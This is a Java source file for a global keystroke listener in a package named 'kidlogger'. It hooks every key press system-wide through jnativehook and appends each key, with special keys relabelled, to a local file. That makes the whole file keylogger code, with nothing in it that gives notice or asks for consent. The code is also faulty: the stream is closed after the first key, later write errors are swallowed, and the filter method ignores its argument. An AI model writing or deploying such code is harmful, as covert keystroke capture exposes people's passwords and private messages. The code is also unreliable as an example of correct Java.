/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package kidlogger;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Taurus
 */
public class GlobalKeyListener implements NativeKeyListener {
    
    
    String msg;
    byte buf[];
    OutputStream os;
    int count;
    
    public GlobalKeyListener() throws FileNotFoundException{
        os = new FileOutputStream("file.txt", true);
        count = 0;
    }
    
    
    public void nativeKeyPressed(NativeKeyEvent e){
        count++;
         msg = NativeKeyEvent.getKeyText(e.getKeyCode());
        msg = filter(msg);
        buf = msg.getBytes();
        try {
            os.write(buf);
            os.close();
            System.out.println(msg);
        } catch (IOException ex) {
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public String filter(String message){
        switch (msg) {
            case "Space":
                msg= " ";
                break;
            case "Right":
                msg = " [->] ";
                break;
            case "Left":
                msg = " [<-] ";
                break;
            case "Up":
                msg = " [Up key] ";
                break;
            case "Down":
                msg = " [Down key] ";
                break;
            case "Shift":
                msg = " [Shift] ";
                break;
            case "Control":
                msg = " [control] ";
                break;
            case "Period":
                msg = " [.] ";
                break;
            case "Alt":
                msg = " [Alt] ";
                break;
            case "Enter":
                msg= " \n ";
                break;
            default:
                break;
        }
        if(count%10==0){msg=msg+"\n";}
        return msg;
    }
}

